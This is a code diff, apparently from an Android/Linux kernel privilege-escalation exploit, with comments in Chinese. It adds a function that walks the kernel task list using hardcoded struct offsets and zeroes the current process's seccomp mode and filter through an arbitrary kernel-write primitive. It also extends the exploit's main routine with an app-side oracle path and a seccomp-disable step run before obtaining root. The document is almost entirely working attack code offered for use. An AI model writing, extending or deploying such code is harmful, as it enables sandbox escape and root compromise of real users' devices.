@@ -209,6 +209,49 @@ static pid_t spawn_allocation_keeper(void) {
   }
 }
 
+// ===== 新增：关闭当前进程的 Seccomp =====
+static int disable_seccomp(int fd) {
+  // 从 init_task 开始遍历进程链表，找到当前进程
+  uint64_t task = kernel_read64(fd, INIT_TASK + 0x30); // tasks.next
+  pid_t my_pid = getpid();
+  uint64_t my_task = 0;
+  
+  for (int i = 0; i < 2000 && task != 0; i++) {
+    uint64_t task_struct = task - 0x30; // 回退到 task_struct 头部
+    uint32_t pid = 0;
+    // 读取 PID，偏移 0x3a0（常见值，可能需要调整）
+    if (kernel_read_data(fd, task_struct + 0x3a0, &pid, 4) < 0) {
+      task = kernel_read64(fd, task_struct + 0x30);
+      continue;
+    }
+    if (pid == (uint32_t)my_pid) {
+      my_task = task_struct;
+      break;
+    }
+    task = kernel_read64(fd, task_struct + 0x30);
+  }
+  
+  if (my_task == 0) {
+    pr_error("[-] disable_seccomp: current task not found\n");
+    return 0;
+  }
+  
+  pr_info("[*] disable_seccomp: current task=%016llx pid=%d\n", 
+          (unsigned long long)my_task, my_pid);
+  
+  // 清零 seccomp.mode（偏移 0x358）和 seccomp.filter（偏移 0x360）
+  uint32_t zero32 = 0;
+  uint64_t zero64 = 0;
+  
+  ssize_t ret_mode = kernel_write_data(fd, my_task + 0x358, &zero32, 4);
+  ssize_t ret_filter = kernel_write_data(fd, my_task + 0x360, &zero64, 8);
+  
+  pr_info("[*] disable_seccomp: mode_ret=%zd filter_ret=%zd errno=%d\n",
+          ret_mode, ret_filter, errno);
+  
+  return (ret_mode == 4 && ret_filter == 8);
+}
+
 int run_exploit(int argc, char **argv) {
   (void)argc;
   (void)argv;
@@ -223,16 +266,52 @@ int run_exploit(int argc, char **argv) {
     pr_error("slide kaslr leak failed\n");
     return 1;
   }
-  if (getenv("SLIDE_ONLY")) {
+  if (getenv("SLIDE_ONLY") || getenv("P0_ONLY")) {
     pr_success("slide-only done base=%016zx slide=%016zx p0_offset=%08zx\n",
                kaslr_base, kaslr_slide, slide_p0_offset);
     return 0;
   }
 
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+  reset_pipe_attempt();
+  pipebuf_page_base = prepare_pipe_buffer_page();
+  pr_info("fresh physrw pipe page=%016zx\n", pipebuf_page_base);
+  if (!is_direct_ptr(pipebuf_page_base)) {
+    return 1;
+  }
+#endif
+
   pin_to_core(CORE);
   page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
 
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+  if (!page_base) {
+    return 1;
+  }
+  for (int attempt = 1; attempt <= 1; attempt++) {
+    int triggered = app_trigger_fops_slide_route();
+    int verified = triggered && try_cfi_stage();
+    pr_info("app fops slide attempt=%d/1 triggered=%d verified=%d "
+            "step=%d errno=%d\n",
+            attempt, triggered, verified, cfi_last_step, cfi_last_errno);
+    if (verified || cfi_dirty_seen) {
+      break;
+    }
+  }
+#else
   run_main_route_threads();
+#endif
+
+  // ===== 新增：在 physrw 可用后立即关闭 Seccomp =====
+  if (atomic_load(&cfi_stage_done) && !root_child_done) {
+    int ashmem_fd = open_ashmem_device();
+    if (ashmem_fd >= 0) {
+      pr_info("[*] attempting to disable seccomp before root...\n");
+      int seccomp_ok = disable_seccomp(ashmem_fd);
+      pr_info("[*] seccomp disable result: %d\n", seccomp_ok);
+      close(ashmem_fd);
+    }
+  }
 
   pr_success("pipe-physrw-summary pid=%d done=%d root=%d kaslr=%d base=%016zx slide=%016zx\n",
              getpid(), atomic_load(&cfi_stage_done), root_child_done,
